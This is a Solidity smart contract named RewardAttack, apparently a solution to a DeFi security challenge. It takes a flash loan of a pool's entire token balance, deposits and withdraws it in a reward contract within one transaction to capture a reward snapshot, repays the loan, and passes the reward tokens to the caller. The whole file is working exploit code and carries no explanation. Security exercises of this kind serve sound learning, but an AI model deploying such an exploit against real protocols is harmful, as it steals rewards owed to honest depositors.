// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IPool {
    function flashLoan(uint256 amount) external;
}

interface IRewarder {
    function deposit(uint256 amount) external;

    function withdraw(uint256 amount) external;
}

contract RewardAttack {
    using Address for address;
    IERC20 token;
    address wallet;
    IPool pool;
    uint256 balance;
    IRewarder rewarder;
    IERC20 rewardToken;

    constructor(
        IERC20 _token,
        IERC20 _rToken,
        IPool _pool,
        IRewarder _rewarder
    ) {
        token = _token;
        rewardToken = _rToken;
        pool = _pool;
        balance = _token.balanceOf(address(_pool));
        rewarder = _rewarder;
    }

    function receiveFlashLoan(uint256 amount) external {
        rewarder.deposit(amount);
        rewarder.withdraw(amount);
        token.transfer(address(pool), amount);
    }

    function attack() public {
        token.approve(address(rewarder), balance);
        pool.flashLoan(balance);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
}
